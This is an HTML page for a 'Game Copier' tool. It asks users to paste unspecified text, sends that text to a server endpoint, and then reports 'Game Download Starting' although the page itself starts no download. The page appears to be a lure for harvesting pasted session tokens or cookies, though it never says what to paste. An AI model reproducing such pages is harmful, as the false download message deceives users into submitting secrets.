<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Game Copier</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');

* { box-sizing: border-box; margin: 0; padding: 0; }

body, html {
  font-family: 'Roboto', sans-serif;
  height: 100%;
  overflow: hidden;
  background: #222;
  color: #fff;
  display: flex;
  justify-content: center;
  align-items: center;
}

canvas {
  position: absolute;
  top: 0;
  left: 0;
  z-index: 0;
}

.container {
  position: relative;
  z-index: 1;
  background: rgba(34, 34, 34, 0.85);
  padding: 25px 30px;
  border-radius: 15px;
  width: 350px;
  text-align: center;
  box-shadow: 0 8px 25px rgba(0,0,0,0.3);
}

h2 {
  margin-bottom: 20px;
  font-size: 24px;
  font-weight: 700;
  color: #ccc;
}

textarea {
  width: 100%;
  height: 80px;
  padding: 10px;
  border-radius: 10px;
  border: none;
  outline: none;
  resize: none;
  font-size: 14px;
  background: #eee;
  color: #333;
  margin-bottom: 15px;
}

button {
  padding: 10px 25px;
  border: none;
  border-radius: 10px;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  background: #888;
  color: #fff;
  transition: all 0.3s ease;
}

button:hover {
  background: #666;
  transform: scale(1.05);
}

#status {
  margin-top: 15px;
  font-size: 14px;
  color: #b2ff59;
  word-wrap: break-word;
}
</style>
</head>
<body>

<canvas id="bg"></canvas>

<div class="container">
  <h2>Game Copier</h2>
  <textarea id="text" placeholder="Paste your text here..."></textarea>
  <button onclick="release()">Start process</button>
  <p id="status"></p>
</div>

<script>
// ===== Canvas Background =====
const canvas = document.getElementById('bg');
const ctx = canvas.getContext('2d');
let w = canvas.width = window.innerWidth;
let h = canvas.height = window.innerHeight;

window.addEventListener('resize', () => {
  w = canvas.width = window.innerWidth;
  h = canvas.height = window.innerHeight;
});

// Particles
const particles = [];
const numParticles = 60;

for(let i=0; i<numParticles; i++){
  particles.push({
    x: Math.random() * w,
    y: Math.random() * h,
    vx: (Math.random() - 0.5) * 0.5,
    vy: (Math.random() - 0.5) * 0.5,
    radius: 2 + Math.random() * 2
  });
}

function draw(){
  ctx.clearRect(0,0,w,h);
  
  // Draw particles
  for(let i=0;i<numParticles;i++){
    const p = particles[i];
    ctx.beginPath();
    ctx.arc(p.x,p.y,p.radius,0,Math.PI*2);
    ctx.fillStyle = '#b2ff59';
    ctx.fill();
  }
  
  // Draw lines
  for(let i=0;i<numParticles;i++){
    for(let j=i+1;j<numParticles;j++){
      const p1 = particles[i];
      const p2 = particles[j];
      const dist = Math.hypot(p1.x - p2.x, p1.y - p2.y);
      if(dist < 120){
        ctx.strokeStyle = 'rgba(178,255,89,' + (1 - dist/120) + ')';
        ctx.lineWidth = 1;
        ctx.beginPath();
        ctx.moveTo(p1.x,p1.y);
        ctx.lineTo(p2.x,p2.y);
        ctx.stroke();
      }
    }
  }
  
  // Move particles
  for(let i=0;i<numParticles;i++){
    const p = particles[i];
    p.x += p.vx;
    p.y += p.vy;
    if(p.x < 0 || p.x > w) p.vx *= -1;
    if(p.y < 0 || p.y > h) p.vy *= -1;
  }
  
  requestAnimationFrame(draw);
}

draw();

// ===== Form Submission =====
async function release() {
  const text = document.getElementById("text").value.trim();
  const statusEl = document.getElementById("status");

  if(!text){
    statusEl.innerText = "Please enter some text!";
    return;
  }

  statusEl.innerText = "Processing...";

  try {
    const res = await fetch("/api/release", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text })
    });

    if(res.ok){
      statusEl.innerText = "Game Download Starting... (5 minutes)";
    } else {
      const data = await res.json();
      statusEl.innerText = "Error: " + (data.message || "Something went wrong");
    }
  } catch(err) {
    statusEl.innerText = "Error: " + err.message;
  }
}
</script>

</body>
</html>
